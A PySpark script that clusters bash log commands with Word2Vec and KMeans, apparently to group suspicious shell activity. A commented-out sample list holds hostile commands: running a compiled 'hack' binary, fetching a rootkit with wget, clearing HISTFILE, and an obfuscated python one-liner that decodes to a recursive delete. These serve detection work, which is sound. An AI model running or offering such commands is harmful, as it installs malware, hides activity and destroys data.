from pyspark.mllib.clustering import KMeans
from pyspark.mllib.feature import Word2Vec
from pyspark.sql import SQLContext
import numpy
from math import sqrt

sqlctx = SQLContext(sc)
bashlogsDF = sqlctx.parquetFile('/user/cloudera/bashlog')
commandsDF = bashlogsDF.select(bashlogsDF.command)

# RDD of list of words in each command
# Review: each command should be considered a "word" instead of each command + arg being an individual word
commandsRDD = commandsDF.rdd.map(lambda row: row.command.split("\n"))

# Convect commands in commandsRDD to vectors.
w2v = Word2Vec()
model = w2v.setVectorSize(2).fit(commandsRDD)

commandsListRDD = commandsDF.rdd.flatMap(lambda row: row.command.split("\n"))
commandsList = sc.parallelize(commandsListRDD.take(10000)).collect()
vectorsList = []

for command in commandsList:
    try:
        vectorsList.append(numpy.array(model.transform(command)))
    except ValueError:
        pass

kmdata = sc.parallelize(vectorsList, 1024)

k = int(sqrt(len(vectorsList) / 2))

# Build the model (cluster the data using KMeans)
clusters = KMeans.train(kmdata, k, maxIterations=10, runs=10, initializationMode="random")

d = dict()
for command in commandsList:
    try:
        vector = model.transform(command)
        cluster = clusters.predict(numpy.array(vector))
        d.setdefault(cluster, []).append(command)
    except:
        pass


'''
sqlctx = SQLContext(sc)
df = sqlctx.read.load("/user/cloudera/bashlog/year=2015/month=07").cache()
cmdsDF = df.select(df.command).map(lambda row: Row(command=row.command.split(" "))).toDF()
cmdsDF.cache()

word2Vec = Word2Vec(vectorSize=100, minCount=1, inputCol="command", outputCol="features")
w2model = word2Vec.fit(cmdsDF)

resultDF = w2model.transform(cmdsDF)
resultDF.cache()

kmeans = KMeans(k=650, seed=42, featuresCol="features", predictionCol="prediction", maxIter=10, initSteps=3)
kmodel = kmeans.fit(resultDF)

centers = kmodel.clusterCenters()
transformed = kmodel.transform(resultDF)

rows = transformed.collect()
>>> transformed.where(transformed.prediction == 2).select(transformed.command).take(50)

documentDF = sqlctx.createDataFrame([
  ("gcc hack.c -o hack;./hack".split(" "), ),
  ("wget http://wwww.my.com/rootkit.gz".split(" "), ),
  ("modprobe m.o".split(" "), ),
  ("unset HISTFILE".split(" "), ),
  ("python -c 'import os; os.system(''.join([chr(ord(i)-1) for i in 'sn!.sg!+']))'".split(" "), )
], ["command"])

save transformed DF into parquet, then load it, re-fit models using it. Much faster this way
since we dont have a save/.load function
'''